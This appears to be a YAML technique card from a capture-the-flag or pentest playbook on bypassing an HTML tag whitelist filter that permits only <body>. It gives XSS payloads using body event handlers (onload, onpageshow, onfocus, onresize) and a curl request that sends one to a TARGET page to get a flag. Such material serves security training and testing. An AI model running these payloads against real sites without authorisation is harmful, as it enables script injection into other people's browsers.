name: xss_body_tag_whitelist_bypass
category: web
tags: [xss, whitelist, body_tag, onload]
indicators:
  - "Tag whitelist filtering (only specific tags allowed)"
  - "Negative lookahead regex for tag filtering"
  - "User input directly in HTML"
  - "body tag whitelisted"

tricks:
  - name: "Step 1: Identify filter regex"
    when: "Found XSS input point"
    how: "Analyze the whitelist pattern"
    payload: |
      # Filter regex: <(?!body\b)[^>]+>
      # This uses negative lookahead (?!body\b)
      # Meaning: remove all tags EXCEPT <body>

  - name: "Step 2: Use whitelisted body tag"
    when: "body tag is allowed"
    how: "Add onload event to body tag"
    payload: |
      <body onload=alert('XSS')>
      # body tag passes the filter
      # onload event triggers JavaScript when body loads

  - name: "Step 3: Trigger XSS and get flag"
    when: "Execute attack"
    how: "Send payload via name parameter"
    payload: |
      curl "http://TARGET/page?name=<body%20onload=alert('XSS')>"
      # Response: Congratulations! Here is the flag: flag{...}

  - name: "Alternative: Other body events"
    when: "Need variations"
    how: "Try different body event handlers"
    payload: |
      <body onpageshow=alert('XSS')>
      <body onfocus=alert('XSS') tabindex=0 autofocus>
      <body onresize=alert('XSS')>
